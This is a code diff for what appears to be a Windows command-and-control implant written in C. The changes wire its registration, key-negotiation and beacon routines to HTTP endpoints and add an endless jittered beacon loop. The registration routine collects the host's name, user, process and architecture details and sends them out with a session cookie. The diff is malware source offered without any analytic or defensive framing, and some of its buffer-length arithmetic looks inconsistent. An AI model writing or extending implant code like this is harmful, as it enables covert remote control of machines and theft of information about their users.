@@ -201,18 +201,22 @@ void agent_beacon() {
      *      Key         16      (CHAR*)
     */
 
-    data.status = 2;
-    data.format = "%d:%s";
+    // data.status = 2;
+    // data.format = "%d:%s";
+    data.format = "%s";
+    transport.path = "api/beacon";
 
-    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie);
+    DWORD pointer_length = strlen(data.format) + strlen(auth.cookie);
     CHAR* data_pointer = malloc(pointer_length);
-    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie);
+    sprintf_s(data_pointer, pointer_length, data.format, auth.cookie);
 
-    DWORD data_length = pointer_length - strlen(data.format) - 2;
+    DWORD data_length = pointer_length - strlen(data.format);
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
     log_info("Buffer: %s", buffer); 
+
+    http_request();
 
     goto clean_memory;
     clean_memory:
@@ -246,8 +250,10 @@ void register_device() {
     process_info.dwSize = sizeof(PROCESSENTRY32);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    data.status = 1;
-    data.format = "%d:%s,%s,%s,%lu,%s,%s";
+    // data.status = 1;
+    // data.format = "%d:%s,%s,%s,%lu,%s,%s";
+    data.format = "%s,%s,%s,%lu,%s,%s";
+    transport.path = "api/register";
 
     if (GetComputerNameA(info.hostname, &default_length)) {
         log_info("Hostname %s", info.hostname);
@@ -289,11 +295,11 @@ void register_device() {
         log_error("Error: %lu\n", dw_error);
     }
 
-    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
+    DWORD pointer_length = strlen(data.format) + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
     CHAR* data_pointer = malloc(pointer_length);
-    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);
+    sprintf_s(data_pointer, pointer_length, data.format, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);
 
-    DWORD data_length = pointer_length - strlen(data.format) + 3;
+    DWORD data_length = pointer_length - strlen(data.format) + 5;
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
@@ -322,12 +328,14 @@ void negotiate_key(CHAR* keyword) {
      * 
     */
 
-    data.status = 0;
-    data.format = "%d:%s";
+    // data.status = 0;
+    // data.format = "%d:%s";
+    data.format = "%s";
+    transport.path = "api/negotiate";
 
-    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.keyword);
+    DWORD pointer_length = strlen(data.format) + strlen(auth.keyword);
     CHAR* data_pointer = malloc(pointer_length);
-    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.keyword);
+    sprintf_s(data_pointer, pointer_length, data.format, auth.keyword);
 
     DWORD data_length = pointer_length - strlen(data.format) - 2;
     CHAR* buffer = encode(data_pointer, data_length);
@@ -384,6 +392,10 @@ int main(int argc, char* argv[]) {
 
     register_device();
     Sleep(calculate_jitter(3, 30));
-    // agent_beacon();
-    // Sleep(calculate_jitter(3, 30));
+
+    while (true) {
+        log_info("Using key: %s", auth.cookie);
+        agent_beacon();
+        Sleep(calculate_jitter(3, 30));
+    }
 }
